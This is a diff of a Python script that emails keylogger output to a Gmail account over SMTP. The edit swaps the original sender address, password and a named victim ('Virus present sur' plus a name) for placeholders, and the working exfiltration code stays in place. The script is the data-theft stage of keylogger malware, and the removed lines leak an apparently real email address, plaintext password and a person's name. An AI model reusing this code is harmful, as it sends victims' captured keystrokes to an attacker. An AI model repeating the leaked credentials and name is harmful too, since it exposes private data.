@@ -4,16 +4,16 @@ from email.MIMEText import MIMEText
 from email.MIMEBase import MIMEBase
 from email import encoders
 
-fromaddr = "sangohan50@gmail.com"
-toaddr = "sangohan50@gmail.com"
+fromaddr = "xxxxx@gmail.com"
+toaddr = "xxxxx@gmail.com"
 
 msg = MIMEMultipart()
 
 msg['From'] = fromaddr
 msg['To'] = toaddr
-msg['Subject'] = "Keylogger Output Franck Trehout"
+msg['Subject'] = "Keylogger Output from NAME"
 
-body = "Virus present sur : Franck Trehout"
+body = "Body's message"
 
 msg.attach(MIMEText(body, 'plain'))
 
@@ -29,7 +29,7 @@ msg.attach(part)
 
 server = smtplib.SMTP('smtp.gmail.com', 587)
 server.starttls()
-server.login(fromaddr, "Huberville1")
+server.login(fromaddr, "YourPassword")
 text = msg.as_string()
 server.sendmail(fromaddr, toaddr, text)
 server.quit()
